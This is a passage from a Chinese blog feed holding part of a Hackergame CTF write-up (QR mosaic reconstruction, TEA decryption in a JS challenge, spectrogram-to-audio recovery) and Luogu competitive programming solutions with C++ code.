class="number">1</span>):</span><br><span class="line">                x1,y1,x2,y2 = getRange(x,y)</span><br><span class="line">                inx1,iny1,inx2,iny2 = <span class="built_in">max</span>(x1,qx1),<span class="built_in">max</span>(y1,qy1),<span class="built_in">min</span>(x2,qx2),<span class="built_in">min</span>(y2,qy2)</span><br><span class="line">                avr = avr + (iny2-iny1+<span class="number">1</span>)*(inx2-inx1+<span class="number">1</span>)</span><br><span class="line">            fillN = fillN &gt;&gt; <span class="number">1</span></span><br><span class="line">    newres = avr/(MSBLOCK*MSBLOCK)</span><br><span class="line">    <span class="keyword">if</span> (newres &lt; comp-<span class="number">0.1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1919810</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(math.floor((avr/(MSBLOCK*MSBLOCK))*<span class="number">255</span>)/<span class="number">255</span>-comp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">putRec</span>(<span class="params">i,j</span>):<span class="comment">#放置识别码块</span></span><br><span class="line">    kimeta[i][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    kimeta[i][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i+<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i+<span class="number">1</span>][j-<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    kimeta[i-<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    res_arr[i-<span class="number">1</span>][j+<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(i-<span class="number">2</span>,i+<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(j-<span class="number">2</span>,j+<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(x-i)==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">abs</span>(y-j)==<span class="number">2</span>:</span><br><span class="line">                kimeta[x][y]=<span class="number">1</span></span><br><span class="line">                res_arr[x][y]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">putRec(<span class="number">28</span>,<span class="number">28</span>)</span><br><span class="line">putRec(<span class="number">28</span>,<span class="number">50</span>)</span><br><span class="line">putRec(<span class="number">50</span>,<span class="number">50</span>)</span><br><span class="line">putRec(<span class="number">50</span>,<span class="number">28</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>,<span class="number">52</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">9</span> <span class="keyword">or</span> i==<span class="number">51</span> <span class="keyword">or</span> j==<span class="number">12</span> <span class="keyword">or</span> j==<span class="number">54</span>:</span><br><span class="line">            kimeta[i][j]=<span class="number">1</span></span><br><span class="line">            res_arr[i][j]=pre_arr[i*QRBLOCK+<span class="number">3</span>][j*QRBLOCK+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">new_arr =  [[<span class="number">1</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(SIZE)]</span><br><span class="line">fked =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"></span><br><span class="line">cntt = <span class="number">0</span></span><br><span class="line">savecnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">i,j</span>):<span class="comment">#从马赛克块的i行j列开始</span></span><br><span class="line">    <span class="keyword">global</span> cntt,savecnt</span><br><span class="line">    cntt = cntt+<span class="number">1</span></span><br><span class="line">    LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class="line">    <span class="comment">#落在哪个二维码方块上</span></span><br><span class="line">    <span class="keyword">if</span> (cntt==<span class="number">200000</span>):<span class="comment">#保存中途结果</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">                    new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class="line">        MatrixToImage(np.array(new_arr)).save(<span class="string">&#x27;mid%s.bmp&#x27;</span>%savecnt)</span><br><span class="line">        savecnt = savecnt + <span class="number">1</span></span><br><span class="line">        cntt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i&gt;=<span class="number">20</span> <span class="keyword">or</span> j&lt;<span class="number">0</span> <span class="keyword">or</span> j&gt;=<span class="number">20</span> <span class="keyword">or</span> fked[i][j]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    fked[i][j]=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    nowMin , nowSol = <span class="number">114514191981.0</span> , (<span class="number">1</span>&lt;&lt;(EACH*EACH))-<span class="number">1</span></span><br><span class="line">    tmpp =  [[<span class="number">0</span> <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            tmpp[x-LUR][y-LUC]=vis[x][y]</span><br><span class="line">    <span class="keyword">for</span> filN <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;(EACH*EACH)):<span class="comment">#枚举每个马赛克块影响到的3*3=9个QR块</span></span><br><span class="line">        tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class="number">2</span>][Y+j*MSBLOCK+<span class="number">2</span>],LUR,LUC)<span class="comment">#同样是乱写的offset+2</span></span><br><span class="line">        <span class="keyword">if</span> tmp &lt; <span class="number">0.00000001</span>:</span><br><span class="line">            nowSol = filN</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                    vis[x][y] = <span class="number">1</span></span><br><span class="line">                    res_arr[x][y]=nowSol&amp;<span class="number">1</span></span><br><span class="line">                    nowSol = nowSol&gt;&gt;<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> ((i+<span class="number">1</span>&lt;<span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i+<span class="number">1</span>][j]) <span class="keyword">and</span> dfs(i+<span class="number">1</span>,j)) <span class="keyword">or</span> (j+<span class="number">1</span>&lt;<span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i][j+<span class="number">1</span>]) <span class="keyword">and</span> dfs(i,j+<span class="number">1</span>)) <span class="keyword">or</span> (i-<span class="number">1</span>&gt;=<span class="number">0</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i-<span class="number">1</span>][j]) <span class="keyword">and</span> dfs(i-<span class="number">1</span>,j)) <span class="keyword">or</span> (j-<span class="number">1</span>&gt;=<span class="number">0</span> <span class="keyword">and</span> (<span class="keyword">not</span> fked[i][j-<span class="number">1</span>]) <span class="keyword">and</span> dfs(i,j-<span class="number">1</span>))):</span><br><span class="line">                fked[i][j]=<span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                        vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            </span><br><span class="line">    fked[i][j]=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">            vis[x][y] = tmpp[x-LUR][y-LUC]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#预先扫描，把能确定的、没有多解的先填上</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        LUR , LUC= (X+i*MSBLOCK)//QRBLOCK , (Y+j*MSBLOCK)//QRBLOCK</span><br><span class="line">        succnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> filN <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1</span>&lt;&lt;(EACH*EACH)):</span><br><span class="line">                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+<span class="number">2</span>][Y+j*MSBLOCK+<span class="number">2</span>],LUR,LUC)</span><br><span class="line">                <span class="keyword">if</span> tmp &lt; <span class="number">0.00000001</span>:</span><br><span class="line">                    succnt = succnt + <span class="number">1</span></span><br><span class="line">                    nowSol = filN</span><br><span class="line">        <span class="keyword">if</span> succnt == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(LUR,LUR+EACH) :</span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(LUC,LUC+EACH):</span><br><span class="line">                    kimeta[x][y] = <span class="number">1</span></span><br><span class="line">                    res_arr[x][y]=nowSol&amp;<span class="number">1</span></span><br><span class="line">                    nowSol = nowSol&gt;&gt;<span class="number">1</span></span><br><span class="line">dfs(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,SIZE):</span><br><span class="line">        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]</span><br><span class="line">MatrixToImage(np.array(new_arr)).save(<span class="string">&#x27;resu.bmp&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最终效果：<img src="https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg" alt="QRCode" loading="lazy"></p><hr><h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><p>web× reverse√<br>打开网页查看js，找到flag.js，在<a href="http://jsnice.org/">jsnice.org</a>反混淆后自己手动再替换下几个迷人眼的常量，之后进行代码审计，会发现这是个TEA加密。如何发现是TEA呢？我搜了好久，后来有人告诉我只需要搜常量就行（还需要学习一个人生经验）。<br>我们需要找到一个字符串s，使得s.encrypt(“{那串数字密钥}”)&#x3D;&#x3D;&#x3D; “6f……0c”<br>把密文切片避免转换后数字过大，在题目页面下<code>F12</code>，进入Console里执行：</p><pre><code class="javascript">window.btoa(LongToStr4(Base16ToLong(&#39;6fbde674&#39;))+LongToStr4(Base16ToLong(&#39;819a59bf&#39;))+LongToStr4(Base16ToLong(&#39;a1209256&#39;))+LongToStr4(Base16ToLong(&#39;5b4ca2a7&#39;))+LongToStr4(Base16ToLong(&#39;a11dc670&#39;))+LongToStr4(Base16ToLong(&#39;c678681d&#39;))+LongToStr4(Base16ToLong(&#39;af4afb67&#39;))+LongToStr4(Base16ToLong(&#39;04b82f0c&#39;)))</code></pre><p>得到密文dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&#x2F;tKrwwvuAQ&#x3D;<br>谷歌<code>TEA decryption online</code>，进入<a href="https://www.mefancy.com/obfuscation/encryption-generator.php">https://www.mefancy.com/obfuscation/encryption-generator.php</a>把上面那串数字密钥（13…）还有密文丢进去就出flag了。</p><hr><h2 id="p😭q"><a href="#p😭q" class="headerlink" title="p😭q"></a>p😭q</h2><p>老外大奥流泪.gif  早知道，还是原道.jpg<br>先把gif的帧提取出来方便处理：</p><pre><code class="python">import osimport sysfrom PIL import Imagedef extractFrames(inGif, outFolder):    frame = Image.open(inGif)    nframes = 0    while frame:        frame.save(&#39;./dest/%s.png&#39; % (nframes))        nframes += 1        try:            frame.seek(nframes)        except EOFError:            break;    return Trueif __name__ == &#39;__main__&#39;:    image = os.path.abspath(sys.argv[1])    dest = os.path.join(os.path.dirname(image), &quot;dest&quot;)    if not os.path.exists(dest):        os.mkdir(dest)    extractFrames(image, dest)</code></pre><p>然后原题给啥库就用啥库，逆回去：</p><pre><code class="python">from array2gif import write_gif  # version: 1.0.4import librosa  # version: 0.8.1import numpy as np  # version: 1.19.5import soundfile as sffrom PIL import Imageimport matplotlib.pyplot as pltdef ImageToMatrix(filename):    im = Image.open(filename)    height,width = im.size    im = im.convert(&#39;L&#39;)    data = im.getdata()    data = np.matrix(data,dtype=&#39;float&#39;)/255.0    new_data = np.reshape(data,(width,height))    return new_datanp.set_printoptions(threshold=1145141919810)num_freqs = 32quantize = 2min_db = -60max_db = 30fft_window_size = 2048frame_step_size = 512window_function_type = &#39;hann&#39;red_pixel = [255, 0, 0]white_pixel = [255, 255, 255]sample_rate = 22050lis =  [[0.0 for col in range(587)] for row in range(32)]imgg = [[0.0 for col in range(130)] for row in range(92)]for ii in range (0,587):    filename = &#39;./dest/%s.png&#39;%ii    print(filename)    data = ImageToMatrix(filename)    for i in range(0,92):        for j in range(0,130):            imgg[i][j]=data.tolist()[i][j]    for xpos in range(0,32):        for scan in range(0,92):            if imgg[scan][xpos*4+2]&lt;1.0:                  lis[xpos][ii]=float((91-scan)-60)                breakspectrogram =  np.array(lis)audio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)sf.write(&#39;newnew.wav&#39;, audio_signal, sample_rate) </code></pre><p>最后在Adobe Audition CC里随便处理处理，勉强能听了，开始努力听写：<br><code>Theflagis f,l,a,g ......</code>  </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write-Up </tag>
            
            <tag> Hackergame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P5072 [Ynoi2015]盼君勿忘</title>
      <link href="/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20%5BYnoi2015%5D%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/"/>
      <url>/2019/10/08/%E6%B4%9B%E8%B0%B7P5072%20%5BYnoi2015%5D%E7%9B%BC%E5%90%9B%E5%8B%BF%E5%BF%98/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="https://www.luogu.org/problem/P5072">https://www.luogu.org/problem/P5072</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一个序列，每次查询一个区间[l,r]中所有子序列分别去重后的和mod p</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>我们考虑每个数的贡献。即该区间内含有这个数的子序列个数。用补集转化为不含这个数的子序列个数。<br>那么，假设这个数在[l,r]内出现了k次，则一共有2^(r-l+1) -2^(r-l+1-k)个子序列包含这个数。<br>本题可以离线，因此选择使用莫队，过程中维护cnt[k]表示区间内恰好出现k次的数字个数，维护sum[j]表示区间内恰好出现j次的数字之和（区间内出现次数相同的数，对于这些数，区间中包含这些数的子序列个数都相同，因此存数字之和就行）。<br>然而这样时间复杂度为O(询问次数*单次询问复杂度)&#x3D;O(n*max(sqrt(n),n))&#x3D;O(nm)，并不可行。我们发现时间瓶颈不在莫队的sqrt(n)，而是在单次查询中求解的复杂度n。<br>有2个套路可供使用：出现次数大于sqrt(n)的数不超过sqrt(n)个，值不为0的cnt[k]少于2*sqrt(n)个（反证易得，本质类似）。 </p><ul><li>对于第一个套路，我们分类讨论：出现次数小于等于sqrt(n)，则统计每个出现次数的数字之和；大于sqrt(n)的用哈希表(unordered_set,C++11)存下具体的数字和其出现次数。这样每次查询是sqrt(n)。  </li><li>笔者使用的则是第二个套路：val[x]表示出现次数恰好为x的数字之和（同上文的sum[j]）。随着莫队l,r指针的移动，把所有可能变为非0的val[x]记下来，指针移动完毕后再对其进行筛选，把确实非0的val[x]保留，其他去除。这样计算单次答案的复杂度就等同于单次查询中莫队指针移动的平均步数：都是sqrt(n)级别。这样做不需要用到哈希表之类的，常数小了很多，甚至不需要读入优化也能轻松过。</li></ul><p>还没完。我们发现模数是不定的，为了保证单次查询的复杂度压在sqrt(n)以内，我们还有最后一件事情要做：在sqrt(n)的时间内求出2^(r-l+1) 和所有的2^(r-l+1-k)。这里安利一个神奇的方式：每次查询只需要做一次时间复杂度为sqrt(n)的预处理就可以O(1)查询了。<br>假设查询区间长度为len(len&#x3D;r-l+1)，我们记siz&#x3D;sqrt(len)，而后计算2^0 , 2^1 , 2^2 … 2^sqrt(len)，存在数组pow1中；再计算2^sqrt(len) , 2^(2*sqrt(len)) , 2^(3*sqrt(len)) , 2^(4*sqrt(len))… , 2^(sqrt(len)*sqrt(len))，存在数组pow[2]中。以上计算都在mod p意义下进行。<br>这样求2的任意次方都可以O(1)出解:2^k &#x3D;2^(k&#x2F;siz) *2^(k%siz)&#x3D;pow2[k&#x2F;siz]*pow1[k%siz]（记得模p）。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 100005 </span></span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> a[MAXN],val[MAXN*<span class="number">2</span>],cnt[MAXN],ans[MAXN];</span><br><span class="line"><span class="type">int</span> tot,blosiz,powsiz;</span><br><span class="line"><span class="type">int</span> bel[MAXN],pow1[MAXN],pow2[MAXN];</span><br><span class="line"><span class="type">bool</span> calced[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> sum[MAXN];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">query</span> &#123;</span><br><span class="line"><span class="type">int</span> id,l,r,p;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> query &amp;sb) <span class="type">const</span> &#123;</span><br><span class="line"><span class="keyword">return</span> bel[l]!=bel[sb.l] ? bel[l]&lt;bel[sb.l] : (bel[l]&amp;<span class="number">1</span> ? r&lt;sb.r : r&gt;sb.r);</span><br><span class="line">&#125;</span><br><span class="line">&#125; q[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sum[cnt[x]]-=x;</span><br><span class="line">cnt[x]++;</span><br><span class="line">sum[cnt[x]]+=x;</span><br><span class="line">++tot;</span><br><span class="line">val[tot]=cnt[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(<span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sum[cnt[x]]-=x;</span><br><span class="line">cnt[x]--;</span><br><span class="line">sum[cnt[x]]+=x;</span><br><span class="line">++tot;</span><br><span class="line">val[tot]=cnt[x];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">power</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1LL</span>*pow1[x%powsiz]*pow2[x/powsiz]%p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">blosiz=<span class="built_in">sqrt</span>(n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]),bel[i]=(i<span class="number">-1</span>)/blosiz;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;q[i].l,&amp;q[i].r,&amp;q[i].p),q[i].id=i;</span><br><span class="line"><span class="built_in">sort</span>(q+<span class="number">1</span>,q+m+<span class="number">1</span>);</span><br><span class="line"><span class="type">int</span> l=<span class="number">1</span>,r=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (l&gt;q[i].l) <span class="built_in">add</span>(a[--l]);</span><br><span class="line">        <span class="keyword">while</span> (r&lt;q[i].r) <span class="built_in">add</span>(a[++r]);</span><br><span class="line">        <span class="keyword">while</span> (l&lt;q[i].l) <span class="built_in">del</span>(a[l++]);</span><br><span class="line">        <span class="keyword">while</span> (r&gt;q[i].r) <span class="built_in">del</span>(a[r--]);</span><br><span class="line">        </span><br><span class="line"><span class="type">int</span> newtot=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len=r-l+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) </span><br><span class="line"><span class="keyword">if</span> (val[j]&amp;&amp;sum[val[j]]!=<span class="number">0</span>&amp;&amp;!calced[val[j]]) </span><br><span class="line">calced[val[j]]=<span class="number">1</span>,val[++newtot]=val[j];</span><br><span class="line">tot=newtot;</span><br><span class="line"></span><br><span class="line">powsiz=<span class="built_in">sqrt</span>(len)+<span class="number">1</span>;</span><br><span class="line">pow1[<span class="number">0</span>]=pow2[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=powsiz;j++) </span><br><span class="line">pow1[j]=(pow1[j<span class="number">-1</span>]+pow1[j<span class="number">-1</span>])%q[i].p;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j*powsiz&lt;=len;j++) </span><br><span class="line">pow2[j]=<span class="number">1LL</span>*pow2[j<span class="number">-1</span>]*pow1[powsiz]%q[i].p;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> powLen=<span class="built_in">power</span>(len,q[i].p);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) &#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> num=sum[val[j]]%q[i].p;</span><br><span class="line">ans[q[i].id]=(ans[q[i].id]+num*(powLen-<span class="built_in">power</span>(len-val[j],q[i].p)))%q[i].p;</span><br><span class="line">calced[val[j]]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">ans[q[i].id]+=q[i].p;</span><br><span class="line">ans[q[i].id]%=q[i].p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++) </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分块 </tag>
            
            <tag> 哈希 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3950 部落冲突</title>
      <link href="/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/"/>
      <url>/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="https://www.luogu.org/problemnew/show/P3950">https://www.luogu.org/problemnew/show/P3950</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一棵树，每次给定一个操作，有如下两种：  </p><ol><li>将某条边染黑<br>2.询问给定的u,v两点间是否有边被染黑</li></ol><hr><p>###思路<br>询问两点间是否有边被染黑只需要在求LCA时判一下就行。所以直接上树链剖分即可。<br>本题不需要使用线段树，使用树状数组查询路径上是否有任意一段区间和不为0即可。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 